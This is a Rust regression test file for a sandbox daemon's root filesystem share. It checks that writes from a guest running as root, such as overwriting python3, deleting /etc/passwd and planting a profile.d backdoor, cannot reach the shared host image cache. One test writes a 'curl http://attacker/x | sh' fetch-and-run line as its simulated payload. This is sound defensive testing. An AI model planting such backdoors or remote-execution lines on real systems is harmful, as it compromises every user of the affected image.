//! Guest writes through a sandbox's root share must never reach the shared
//! image cache.
//!
//! The sandbox daemon used to boot every sandbox of a given image against the
//! SAME host directory: the shared rootfs cache `~/.iii/cache/<slug>/`
//! returned by `rootfs_cache::resolve_cached`. `__vm-boot` exposed that
//! directory to the guest as `/dev/root` with
//!
//! ```ignore
//! PassthroughFs::builder().root_dir(&args.rootfs).build()
//! ```
//!
//! with no read-only / copy-on-write layer, and iii-init's legacy
//! `pivot_to_tmpfs_root` bind-mounted `/usr`, `/etc`, `/bin`, `/home`, ...
//! read-write from that share. Everything a guest (root inside the VM) wrote
//! to those paths landed in the shared host cache and was inherited by EVERY
//! later sandbox of that image, for every caller.
//!
//! These tests drive the PassthroughFs configuration `__vm-boot` uses for a
//! sandbox root, over a temp dir that stands in for the cached image, issuing
//! the FUSE ops a guest kernel sends for `echo evil > /usr/bin/python3`,
//! `rm /etc/passwd` and `echo x > /etc/profile.d/backdoor.sh`, and assert
//! that the host copy of the shared image is unchanged.

use std::ffi::CString;
use std::fs::File;
use std::io;
use std::path::Path;

use iii_filesystem::{
    Context, DynFileSystem, Extensions, FsOptions, PassthroughFs, ZeroCopyReader,
};

const ROOT_ID: u64 = 1;

fn cstr(s: &str) -> CString {
    CString::new(s).unwrap()
}

/// Guest requests arrive with the guest caller's credentials. Inside the
/// sandbox VM every exec runs as root.
fn guest_root_ctx() -> Context {
    Context {
        uid: 0,
        gid: 0,
        pid: 1,
    }
}

struct Bytes(Vec<u8>, usize);
impl ZeroCopyReader for Bytes {
    fn read_to(&mut self, f: &File, count: usize, off: u64) -> io::Result<usize> {
        use std::os::unix::fs::FileExt;
        let rem = self.0.len() - self.1;
        if rem == 0 {
            return Ok(0);
        }
        let n = f.write_at(&self.0[self.1..self.1 + count.min(rem)], off)?;
        self.1 += n;
        Ok(n)
    }
}

/// A fake "cached image" like ~/.iii/cache/<slug>/ as produced by
/// pull_and_extract_rootfs (`bin/` present => rootfs_cache::is_populated).
fn fake_cached_image(dir: &Path) {
    std::fs::create_dir_all(dir.join("usr/bin")).unwrap();
    std::fs::create_dir_all(dir.join("bin")).unwrap();
    std::fs::create_dir_all(dir.join("etc/profile.d")).unwrap();
    std::fs::write(dir.join("usr/bin/python3"), b"ORIGINAL-PYTHON").unwrap();
    std::fs::write(dir.join("etc/passwd"), b"root:x:0:0::/root:/bin/sh\n").unwrap();
}

/// Same share `vm_boot::root_share` builds for a sandbox boot
/// (`__vm-boot --rootfs-readonly`). Built with no options, as it used to be,
/// the share let these guest writes reach the host.
fn vm_boot_rootfs_share(root: &Path) -> PassthroughFs {
    let fs = PassthroughFs::builder()
        .root_dir(root)
        .read_only(true)
        .build()
        .unwrap();
    fs.init(FsOptions::empty()).unwrap();
    fs
}

fn lookup_path(fs: &PassthroughFs, ctx: Context, path: &str) -> io::Result<u64> {
    let mut ino = ROOT_ID;
    for comp in path.split('/').filter(|c| !c.is_empty()) {
        ino = fs.lookup(ctx, ino, &cstr(comp))?.inode;
    }
    Ok(ino)
}

#[test]
fn guest_overwrite_of_image_binary_must_not_reach_shared_host_cache() {
    let cache = tempfile::tempdir().unwrap();
    fake_cached_image(cache.path());
    let fs = vm_boot_rootfs_share(cache.path());
    let ctx = guest_root_ctx();

    // Guest: `echo evil > /usr/bin/python3`
    let attempt = (|| -> io::Result<()> {
        let ino = lookup_path(&fs, ctx, "usr/bin/python3")?;
        let (h, _) = fs.open(ctx, ino, false, (libc::O_WRONLY | libc::O_TRUNC) as u32)?;
        let h = h.expect("handle");
        let payload = b"#!/bin/sh\n# attacker-controlled\n".to_vec();
        let len = payload.len() as u32;
        fs.write(
            ctx,
            ino,
            h,
            &mut Bytes(payload, 0),
            len,
            0,
            None,
            false,
            false,
            0,
        )?;
        fs.release(ctx, ino, 0, h, false, false, None)?;
        Ok(())
    })();
    eprintln!("guest write attempt result: {attempt:?}");

    let host = std::fs::read(cache.path().join("usr/bin/python3")).unwrap();
    eprintln!(
        "host shared-cache usr/bin/python3 after guest write: {:?}",
        String::from_utf8_lossy(&host)
    );
    assert_eq!(
        host, b"ORIGINAL-PYTHON",
        "a sandbox guest modified the SHARED host image cache; every later sandbox \
         booted from this image (any caller) now runs the modified binary"
    );
}

#[test]
fn guest_delete_in_image_must_not_reach_shared_host_cache() {
    let cache = tempfile::tempdir().unwrap();
    fake_cached_image(cache.path());
    let fs = vm_boot_rootfs_share(cache.path());
    let ctx = guest_root_ctx();

    // Guest: `rm /etc/passwd`
    let etc = lookup_path(&fs, ctx, "etc").unwrap();
    let r = fs.unlink(ctx, etc, &cstr("passwd"));
    eprintln!("guest unlink result: {r:?}");
    assert!(
        cache.path().join("etc/passwd").exists(),
        "a sandbox guest deleted a file from the SHARED host image cache"
    );
}

#[test]
fn guest_created_file_must_not_persist_into_shared_host_cache() {
    let cache = tempfile::tempdir().unwrap();
    fake_cached_image(cache.path());
    let fs = vm_boot_rootfs_share(cache.path());
    let ctx = guest_root_ctx();

    // Guest: `echo 'curl evil|sh' > /etc/profile.d/backdoor.sh`
    let pd = lookup_path(&fs, ctx, "etc/profile.d").unwrap();
    let r = fs.create(
        ctx,
        pd,
        &cstr("backdoor.sh"),
        0o755,
        false,
        libc::O_RDWR as u32,
        0,
        Extensions::default(),
    );
    if let Ok((entry, Some(h), _)) = &r {
        let payload = b"curl http://attacker/x | sh\n".to_vec();
        let len = payload.len() as u32;
        let _ = fs.write(
            ctx,
            entry.inode,
            *h,
            &mut Bytes(payload, 0),
            len,
            0,
            None,
            false,
            false,
            0,
        );
        let _ = fs.release(ctx, entry.inode, 0, *h, false, false, None);
    }
    eprintln!("guest create result ok={}", r.is_ok());
    assert!(
        !cache.path().join("etc/profile.d/backdoor.sh").exists(),
        "a file created by one sandbox guest persisted into the SHARED host image cache"
    );
}
